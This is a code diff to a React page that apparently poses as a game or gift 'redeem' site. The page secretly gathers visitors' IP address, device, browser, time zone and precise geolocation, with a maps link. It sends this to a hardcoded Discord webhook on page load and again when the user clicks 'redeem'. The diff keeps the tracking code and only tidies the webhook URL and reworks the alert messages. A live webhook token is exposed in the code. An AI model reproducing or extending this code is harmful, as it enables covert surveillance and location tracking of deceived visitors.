@@ -22,6 +22,7 @@ const Index = () => {
     longitude: null,
     accuracy: null
   });
+  const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";
 
   useEffect(() => {
     // Set initial system info
@@ -79,13 +80,13 @@ const Index = () => {
             locationString = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
           }
           
-          await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
+          await fetch(webhookUrl, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-              content: `New visitor!\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}\n**Location**: ${locationString}`,
+              content: `🔔 **NEW VISITOR DETECTED!**\n\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}\n**Location**: ${locationString}`,
             }),
           });
         }, 3000);
@@ -118,13 +119,13 @@ const Index = () => {
       }
       
       // Send enhanced system info to webhook
-      await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
+      await fetch(webhookUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          content: `📱 **USER CLICKED REDEEM!** 📱\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**Location**: ${locationString}\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
+          content: `🎮 **USER CLICKED REDEEM BUTTON!** 🎮\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**Location**: ${locationString}\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
         }),
       });
 
